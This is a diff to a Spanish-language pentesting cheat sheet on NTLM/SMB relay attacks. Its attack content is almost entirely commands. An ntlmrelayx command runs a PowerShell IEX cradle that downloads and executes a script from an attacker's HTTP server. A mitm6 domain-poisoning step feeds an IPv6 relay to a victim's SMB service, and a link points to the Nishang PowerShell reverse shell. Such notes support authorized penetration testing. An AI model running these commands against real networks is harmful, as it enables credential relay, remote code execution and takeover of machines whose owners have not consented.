@@ -47,9 +47,14 @@ ntlmrelayx.py -tf <targets.txt> -smb2support
 ```
 ntlmrelayx.py -tf <targets.txt> -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.0:8000/PS.ps1')"
 ```
+[Descargar shell de Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
 # Ejecutar comandos mediante un SMB Relay por IPv6
+Primero envenenamos el dominio con `mitm6` para luego entrar en una sesión interactiva con `ntlmrelayx` y mediante el comando `socks` podremos ver las conexiones y el `AdminStatus` de los usuarios.
+```
+mitm6 -d <dominio>
+```
 ```
 ntlmrelayx.py -6 -wh <ip_atacante> -t smb://<ip_victima> -socks -debug -smb2support
 ```
-[Descargar shell de Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+
